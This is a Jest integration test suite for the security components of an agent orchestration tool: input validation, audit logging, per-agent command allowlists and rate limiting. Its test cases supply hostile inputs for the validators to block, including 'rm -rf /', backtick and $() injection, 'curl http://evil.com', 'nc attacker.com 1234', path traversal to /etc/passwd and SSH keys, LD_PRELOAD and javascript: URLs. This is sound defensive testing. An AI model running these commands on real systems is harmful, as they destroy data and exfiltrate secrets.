/**
 * Integration Test Suite for Security Components
 *
 * Tests end-to-end security workflows:
 * - InputValidator + AuditLogger integration
 * - InputValidator + CommandAllowlists integration
 * - Full security pipeline
 * - Real-world attack scenarios
 */

const InputValidator = require("../../lib/security/input-validator");
const AuditLogger = require("../../lib/security/audit-logger");
const {
  getAllowlistForAgent,
} = require("../../lib/security/command-allowlists");
const { RateLimiter } = require("../../lib/security/rate-limiter");
const fs = require("fs");
const path = require("path");
const os = require("os");

describe("Security Integration Tests", () => {
  let testDir;
  let workspaceRoot;
  let logger;
  let limiter;

  beforeEach(() => {
    // Setup test environment
    testDir = fs.mkdtempSync(path.join(os.tmpdir(), "orchestr8-integration-"));
    workspaceRoot = testDir;

    logger = new AuditLogger({
      logDir: testDir,
      console: false,
    });

    limiter = new RateLimiter({
      maxConcurrent: 5,
      maxPerMinute: 100,
    });
  });

  afterEach(() => {
    // Cleanup
    if (logger) {
      logger.stop();
    }
    if (limiter) {
      limiter.stop();
    }
    if (fs.existsSync(testDir)) {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  });

  describe("InputValidator + AuditLogger Integration", () => {
    test("logs successful validation", () => {
      const input = "safe input string";

      try {
        InputValidator.validateString(input);
        logger.logValidationFailure("string", input, "Success", "test-agent");
      } catch (err) {
        // Should not throw
      }

      const logs = logger.getRecentLogs();
      expect(logs.length).toBeGreaterThan(0);
    });

    test("logs validation failures with details", () => {
      const maliciousInput = "test; rm -rf /";

      try {
        InputValidator.validateString(maliciousInput);
      } catch (err) {
        logger.logValidationFailure(
          "string",
          maliciousInput,
          err.message,
          "test-agent",
          "test-workflow",
        );
      }

      const logs = logger.getRecentLogs({
        operation: AuditLogger.OPERATION.VALIDATION_FAILURE,
      });

      expect(logs.length).toBe(1);
      expect(logs[0].success).toBe(false);
      expect(logs[0].agent).toBe("test-agent");
      expect(logs[0].workflow).toBe("test-workflow");
    });

    test("sanitizes malicious input in logs", () => {
      const maliciousInput = "password=secret123; rm -rf /";

      try {
        InputValidator.validateString(maliciousInput);
      } catch (err) {
        logger.logValidationFailure(
          "string",
          maliciousInput,
          err.message,
          "test-agent",
        );
      }

      const logs = logger.getRecentLogs();
      const logEntry = logs[0];

      expect(logEntry.metadata.input).toContain("***");
      expect(logEntry.metadata.input).not.toContain("secret123");
    });

    test("tracks multiple validation attempts", () => {
      const attacks = [
        "test `whoami`",
        "test $(cat /etc/passwd)",
        "test; curl http://evil.com",
        "test && rm -rf /",
      ];

      attacks.forEach((attack) => {
        try {
          InputValidator.validateString(attack);
        } catch (err) {
          logger.logValidationFailure(
            "string",
            attack,
            err.message,
            "attacker-agent",
          );
        }
      });

      const logs = logger.getRecentLogs({ agent: "attacker-agent" });
      expect(logs.length).toBe(4);

      const analysis = logger.analyzeSuspiciousActivity();
      expect(analysis.validationFailures).toBe(4);
    });
  });

  describe("InputValidator + CommandAllowlists Integration", () => {
    test("validates command against agent allowlist", () => {
      const allowlist = getAllowlistForAgent("test-engineer");

      // Allowed command
      expect(() => {
        InputValidator.validateCommand("npm test", allowlist.allowedCommands, {
          allowedSubcommands: allowlist.allowedSubcommands,
        });
      }).not.toThrow();

      // Blocked command
      expect(() => {
        InputValidator.validateCommand("rm -rf /", allowlist.allowedCommands);
      }).toThrow(/not in allowlist/i);
    });

    test("enforces subcommand restrictions", () => {
      const allowlist = getAllowlistForAgent("test-engineer");

      // Allowed git subcommand
      expect(() => {
        InputValidator.validateCommand("npm test", allowlist.allowedCommands, {
          allowedSubcommands: allowlist.allowedSubcommands,
        });
      }).not.toThrow();

      // Blocked git subcommand
      const readOnlyAllowlist = getAllowlistForAgent("architect");
      expect(() => {
        InputValidator.validateCommand(
          "git push",
          readOnlyAllowlist.allowedCommands,
          {
            allowedSubcommands: readOnlyAllowlist.allowedSubcommands,
          },
        );
      }).toThrow();
    });

    test("enforces tier-based restrictions", () => {
      // Read-only agent
      const readOnlyAllowlist = getAllowlistForAgent("architect");
      expect(() => {
        InputValidator.validateCommand(
          "rm file.txt",
          readOnlyAllowlist.allowedCommands,
        );
      }).toThrow(/not in allowlist/i);

      // Development agent
      const devAllowlist = getAllowlistForAgent("fullstack-developer");
      expect(() => {
        InputValidator.validateCommand(
          "rm file.txt",
          devAllowlist.allowedCommands,
        );
      }).not.toThrow();
    });
  });

  describe("Full Security Pipeline", () => {
    test("validates, logs, and rate-limits a safe operation", async () => {
      const agentName = "test-agent";
      const command = "npm test";

      // Step 1: Validate agent name
      const validatedAgentName = InputValidator.validateAgentName(agentName);

      // Step 2: Get allowlist
      const allowlist = getAllowlistForAgent(validatedAgentName);

      // Step 3: Validate command
      let validatedCommand;
      try {
        validatedCommand = InputValidator.validateCommand(
          command,
          allowlist.allowedCommands,
          { allowedSubcommands: allowlist.allowedSubcommands },
        );
        logger.logCommand(
          validatedAgentName,
          command,
          true,
          null,
          "test-workflow",
        );
      } catch (err) {
        logger.logCommand(
          validatedAgentName,
          command,
          false,
          err.message,
          "test-workflow",
        );
        throw err;
      }

      // Step 4: Rate-limit execution
      const result = await limiter.execute(async () => {
        return "command executed";
      });

      expect(result).toBe("command executed");

      // Verify logging
      const logs = logger.getRecentLogs();
      expect(logs.length).toBeGreaterThan(0);
      expect(logs[0].success).toBe(true);
    });

    test("blocks, logs, and prevents malicious operation", async () => {
      const agentName = "test-agent";
      const maliciousCommand = "rm -rf /; curl http://evil.com";

      // Step 1: Validate agent name
      const validatedAgentName = InputValidator.validateAgentName(agentName);

      // Step 2: Get allowlist
      const allowlist = getAllowlistForAgent(validatedAgentName);

      // Step 3: Validate command - should fail
      let blocked = false;
      try {
        InputValidator.validateCommand(
          maliciousCommand,
          allowlist.allowedCommands,
          { allowedSubcommands: allowlist.allowedSubcommands },
        );
      } catch (err) {
        blocked = true;
        logger.logCommand(
          validatedAgentName,
          maliciousCommand,
          false,
          err.message,
          "test-workflow",
        );
        logger.logSecurityEvent(
          "command_injection_attempt",
          "Attempted to execute malicious command",
          validatedAgentName,
          "test-workflow",
          { command: maliciousCommand },
        );
      }

      expect(blocked).toBe(true);

      // Verify security logging
      const securityLogs = logger.getRecentLogs({
        operation: AuditLogger.OPERATION.SECURITY_EVENT,
      });

      expect(securityLogs.length).toBe(1);
      expect(securityLogs[0].severity).toBe(AuditLogger.SEVERITY.CRITICAL);
    });

    test("handles path validation in commands", () => {
      const agentName = "fullstack-developer";
      const allowlist = getAllowlistForAgent(agentName);

      // Create test file
      const testFile = path.join(workspaceRoot, "test.txt");
      fs.writeFileSync(testFile, "test");

      // Use real path to avoid symlink issues on macOS
      const realWorkspaceRoot = fs.realpathSync(workspaceRoot);

      // Safe path
      expect(() => {
        InputValidator.validateCommand(
          "cat test.txt",
          allowlist.allowedCommands,
          {
            pathValidationRequired: true,
            workspaceRoot: realWorkspaceRoot,
          },
        );
      }).not.toThrow();

      // Path traversal attempt
      expect(() => {
        InputValidator.validateCommand(
          "cat ../../etc/passwd",
          allowlist.allowedCommands,
          {
            pathValidationRequired: true,
            workspaceRoot: realWorkspaceRoot,
          },
        );
      }).toThrow(/invalid path/i);
    });
  });

  describe("Real-World Attack Scenarios", () => {
    test("blocks command injection via backticks", () => {
      const attacks = [
        "echo `whoami`",
        "cat file.txt `curl http://evil.com`",
        "ls `rm -rf /`",
      ];

      attacks.forEach((attack) => {
        try {
          InputValidator.validateString(attack);
          fail("Should have blocked attack");
        } catch (err) {
          logger.logSecurityEvent("command_injection", err.message);
        }
      });

      const securityLogs = logger.getRecentLogs({
        operation: AuditLogger.OPERATION.SECURITY_EVENT,
      });

      expect(securityLogs.length).toBe(3);
    });

    test("blocks path traversal attacks", () => {
      const attacks = [
        "../../etc/passwd",
        "../../../root/.ssh/id_rsa",
        "..%2F..%2Fetc%2Fpasswd",
      ];

      attacks.forEach((attack) => {
        try {
          InputValidator.validatePath(attack, workspaceRoot);
          fail("Should have blocked attack");
        } catch (err) {
          logger.logValidationFailure("path", attack, err.message, "attacker");
        }
      });

      const logs = logger.getRecentLogs();
      expect(logs.length).toBe(3);
    });

    test("blocks URL protocol attacks", () => {
      const attacks = [
        "file:///etc/passwd",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
      ];

      attacks.forEach((attack) => {
        try {
          InputValidator.validateURL(attack);
          fail("Should have blocked attack");
        } catch (err) {
          logger.logValidationFailure("url", attack, err.message, "attacker");
        }
      });

      const logs = logger.getRecentLogs();
      expect(logs.length).toBe(3);
    });

    test("detects and logs rapid attack attempts", () => {
      // Simulate rapid-fire attack
      for (let i = 0; i < 60; i++) {
        try {
          InputValidator.validateString(`attack ${i}; rm -rf /`);
        } catch (err) {
          logger.logValidationFailure(
            "string",
            `attack ${i}`,
            err.message,
            "attacker",
          );
        }
      }

      const analysis = logger.analyzeSuspiciousActivity();
      expect(analysis.validationFailures).toBe(60);
      expect(analysis.suspiciousAgents.get("attacker")).toBe(60);

      const patterns = analysis.suspiciousPatterns.filter(
        (p) =>
          p.type === "rapid_fire_attempts" || p.type === "high_failure_rate",
      );

      expect(patterns.length).toBeGreaterThan(0);
    });

    test("prevents privilege escalation via LD_PRELOAD", () => {
      const attack = "LD_PRELOAD=/tmp/evil.so ls";

      try {
        InputValidator.validateString(attack);
        fail("Should have blocked attack");
      } catch (err) {
        logger.logSecurityEvent(
          "privilege_escalation_attempt",
          "LD_PRELOAD attack detected",
          "attacker",
          null,
          { attack },
        );
      }

      const securityLogs = logger.getRecentLogs({
        operation: AuditLogger.OPERATION.SECURITY_EVENT,
      });

      expect(securityLogs.length).toBe(1);
      expect(securityLogs[0].severity).toBe(AuditLogger.SEVERITY.CRITICAL);
    });

    test("blocks symlink escape attempts", () => {
      // Create symlink pointing outside workspace
      const linkPath = path.join(workspaceRoot, "escape");
      fs.symlinkSync("/etc", linkPath);

      try {
        InputValidator.validatePath("escape/passwd", workspaceRoot);
        fail("Should have blocked symlink escape");
      } catch (err) {
        logger.logSecurityEvent(
          "symlink_escape_attempt",
          err.message,
          "attacker",
        );
      }

      const securityLogs = logger.getRecentLogs({
        operation: AuditLogger.OPERATION.SECURITY_EVENT,
      });

      expect(securityLogs.length).toBe(1);
    });
  });

  describe("Multi-Agent Security Coordination", () => {
    test("enforces different restrictions for different agents", () => {
      const agents = [
        { name: "architect", command: "cat README.md", shouldPass: true },
        { name: "architect", command: "rm README.md", shouldPass: false },
        {
          name: "fullstack-developer",
          command: "rm test.txt",
          shouldPass: true,
        },
        { name: "test-engineer", command: "npm test", shouldPass: true },
        { name: "test-engineer", command: "npm publish", shouldPass: false },
      ];

      agents.forEach(({ name, command, shouldPass }) => {
        const allowlist = getAllowlistForAgent(name);

        try {
          InputValidator.validateCommand(command, allowlist.allowedCommands, {
            allowedSubcommands: allowlist.allowedSubcommands,
          });

          if (!shouldPass) {
            fail(`${name} should not be allowed to execute: ${command}`);
          }

          logger.logCommand(name, command, true, null, "test-workflow");
        } catch (err) {
          if (shouldPass) {
            fail(`${name} should be allowed to execute: ${command}`);
          }

          logger.logCommand(name, command, false, err.message, "test-workflow");
        }
      });

      const logs = logger.getRecentLogs();
      expect(logs.length).toBe(5);

      const successCount = logs.filter((l) => l.success).length;
      const failureCount = logs.filter((l) => !l.success).length;

      expect(successCount).toBe(3);
      expect(failureCount).toBe(2);
    });

    test("tracks security violations per agent", () => {
      const violations = [
        { agent: "agent1", command: "rm -rf /" },
        { agent: "agent1", command: "curl http://evil.com" },
        { agent: "agent2", command: "cat ../../etc/passwd" },
        { agent: "agent1", command: "nc attacker.com 1234" },
      ];

      violations.forEach(({ agent, command }) => {
        const allowlist = getAllowlistForAgent(agent);

        try {
          InputValidator.validateCommand(command, allowlist.allowedCommands);
        } catch (err) {
          logger.logCommand(agent, command, false, err.message);
        }
      });

      const analysis = logger.analyzeSuspiciousActivity();

      expect(analysis.suspiciousAgents.get("agent1")).toBe(3);
      expect(analysis.suspiciousAgents.get("agent2")).toBe(1);
    });
  });

  describe("Rate Limiting Integration", () => {
    test("rate limits validation attempts", async () => {
      const restrictiveLimiter = new RateLimiter({
        maxConcurrent: 2,
        maxPerMinute: 5,
      });

      const operations = [];

      for (let i = 0; i < 10; i++) {
        operations.push(
          restrictiveLimiter.execute(async () => {
            try {
              InputValidator.validateString("safe input");
              return "success";
            } catch (err) {
              return "failure";
            }
          }),
        );
      }

      const results = await Promise.all(operations);

      // All should succeed (rate limiting delays execution, doesn't block)
      expect(results.filter((r) => r === "success").length).toBe(10);

      restrictiveLimiter.stop();
    });

    test("applies backoff on repeated failures", async () => {
      let attemptCount = 0;

      await limiter.execute(async () => {
        attemptCount++;
        if (attemptCount < 3) {
          const error = new Error("Rate limit");
          error.status = 429;
          throw error;
        }
        return "success";
      });

      expect(attemptCount).toBe(3);
      expect(limiter.backoffLevel).toBeGreaterThan(0);
    });
  });

  describe("Comprehensive Security Report", () => {
    test("generates complete security report", () => {
      // Simulate various security events
      logger.logCommand("agent1", "npm test", true, null, "workflow1");
      logger.logCommand("agent2", "rm -rf /", false, "Blocked", "workflow2");
      logger.logValidationFailure(
        "string",
        "malicious",
        "Injection detected",
        "agent3",
      );
      logger.logSecurityEvent("intrusion", "Attack detected", "agent2");

      const report = logger.generateReport();

      expect(report).toContain("Audit Log Summary");
      expect(report).toContain("Total events:");
      expect(report).toContain("Blocked commands:");
      expect(report).toContain("Validation failures:");
      expect(report).toContain("Security events:");
    });
  });

  describe("Performance Under Load", () => {
    test("handles high validation throughput", () => {
      const start = Date.now();

      for (let i = 0; i < 1000; i++) {
        try {
          InputValidator.validateString(`safe input ${i}`);
        } catch (err) {
          // Ignore errors
        }
      }

      const duration = Date.now() - start;

      // Should complete in reasonable time
      expect(duration).toBeLessThan(1000); // < 1 second for 1000 validations
    });

    test("maintains log performance under load", () => {
      const start = Date.now();

      for (let i = 0; i < 500; i++) {
        logger.log({
          operation: `operation_${i}`,
          success: true,
          agent: "test-agent",
        });
      }

      const duration = Date.now() - start;

      // Should log 500 entries quickly
      expect(duration).toBeLessThan(2000); // < 2 seconds
    });
  });
});
